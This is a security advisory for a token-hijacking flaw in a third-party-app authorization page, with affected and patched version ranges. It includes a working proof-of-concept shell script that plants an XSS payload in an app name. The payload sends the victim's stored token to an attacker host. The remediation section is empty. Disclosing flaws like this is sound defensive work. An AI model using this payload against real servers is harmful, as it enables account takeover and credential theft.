## Package

No package listed

## Affected versions

>= 10.46.0 < 10.102.4 || >= 11.0.0-alpha.1 < 11.20.2

## Patched versions

11.20.2

## Description

Advisory Author: Acid Chicken (硫酸鶏) root@acid-chicken.com

## Summary

A vulnerability in the authorization page for third-party application could allow a remote attacker to hijack user's token.

## Affected Versions

>= 10.46.0 < 10.102.4 || >= 11.0.0-alpha.1 < 11.20.2

## Proof of Concept

Token hijacking URL generator (shell script)

Requires *bash*, *curl*, and *jq*.

**DO NOT USE THIS COMMAND IN A PRODUCTION ENVIRONMENT**

```
sufferer='localhost:3000' \
attacker='localhost:8080' \
curl -LSs "https://$sufferer/api/auth/session/generate" -d"{\"appSecret\":$( \
  curl -LSs "https://$sufferer/api/app/create" \
    -d'{"name":"<audio><source onerror=\"location.replace(\"'"https://$attacker"'\"+localStorage.getItem(\"i\"))\">","description":"","permission":[]}' \
  | jq .secret \
)}" | jq -r .url
```

## Details

To exploit this vulnerability, the attacker must let target user visit a generated URL.

## Workaround

For users, don't visit suspicious URL. If you can't decide whether an URL is suspicious, don't access any websites. For server owners, see below.

## Remediation
